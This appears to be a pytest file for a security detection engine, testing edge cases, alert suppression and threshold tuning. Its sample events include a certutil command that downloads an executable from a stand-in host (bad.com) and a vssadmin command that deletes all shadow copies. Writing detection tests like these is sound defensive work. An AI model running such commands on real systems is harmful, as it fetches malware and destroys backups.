"""
Regression and Edge Case Tests.
Tests handling of edge cases, missing fields, alert deduplication, and suppression windows.
"""

import os
import pytest
from datetime import datetime, timezone, timedelta
from normalizer.schema import NormalizedEvent, EventType, EventStatus
from normalizer.parsers import AutoNormalizer
from engine import DetectionEngine


@pytest.fixture
def engine():
    rules_path = os.path.join(os.path.dirname(__file__), "..", "..", "rules")
    return DetectionEngine(rules_dir=rules_path)


def test_edge_case_missing_fields_no_crash(engine):
    """Engine must gracefully handle events with empty/None fields."""
    ev = NormalizedEvent(
        host="unknown",
        event_type=EventType.UNKNOWN.value,
        command_line=None,
        process_name=None,
        user=None,
        source_ip=None
    )
    alerts = engine.process_event(ev)
    assert isinstance(alerts, list)


def test_edge_case_unicode_username(engine):
    """Engine and parsers must handle Unicode / international characters properly."""
    ev = NormalizedEvent(
        event_type=EventType.PROCESS_CREATION.value,
        process_name="certutil.exe",
        command_line="certutil.exe -urlcache http://bad.com/a.exe a.exe",
        user="管理员_ñ_⚡",
        host="host-unicode"
    )
    alerts = engine.process_event(ev)
    assert len(alerts) == 1
    assert alerts[0].affected_user == "管理员_ñ_⚡"


def test_alert_suppression_window(engine):
    """
    Duplicate triggers within the configured suppression window must be suppressed
    to prevent analyst alert fatigue.
    """
    base = datetime.now(timezone.utc)
    ev1 = NormalizedEvent(
        timestamp=base,
        event_type=EventType.PROCESS_CREATION.value,
        process_name="vssadmin.exe",
        command_line="vssadmin delete shadows /all /quiet",
        host="srv-target",
        source_ip="10.0.1.5"
    )
    alerts1 = engine.process_event(ev1)
    assert len(alerts1) == 1

    # Second identical event 10 seconds later on same host/ip
    ev2 = NormalizedEvent(
        timestamp=base + timedelta(seconds=10),
        event_type=EventType.PROCESS_CREATION.value,
        process_name="vssadmin.exe",
        command_line="vssadmin delete shadows /all /quiet",
        host="srv-target",
        source_ip="10.0.1.5"
    )
    alerts2 = engine.process_event(ev2)
    # Must be suppressed
    assert len(alerts2) == 0


def test_threshold_override_dynamic_tuning(engine):
    """
    Demonstrates that threshold overrides adjust detection behavior without restart.
    """
    # Override DET-001 threshold to 2 failures instead of 5
    engine.correlator.set_threshold_override("DET-001", {"threshold": 2, "window_seconds": 60})
    
    base = datetime.now(timezone.utc)
    ev1 = NormalizedEvent(
        timestamp=base,
        event_type=EventType.AUTHENTICATION.value,
        action="login_failed",
        status=EventStatus.FAILURE.value,
        user="test-tune",
        source_ip="10.10.10.10",
        host="srv-tune"
    )
    engine.process_event(ev1)

    ev2 = NormalizedEvent(
        timestamp=base + timedelta(seconds=5),
        event_type=EventType.AUTHENTICATION.value,
        action="login_failed",
        status=EventStatus.FAILURE.value,
        user="test-tune",
        source_ip="10.10.10.10",
        host="srv-tune"
    )
    alerts = engine.process_event(ev2)
    
    det_alerts = [a for a in alerts if a.rule_id == "DET-001"]
    assert len(det_alerts) == 1
    assert det_alerts[0].evidence["threshold_configured"] == 2
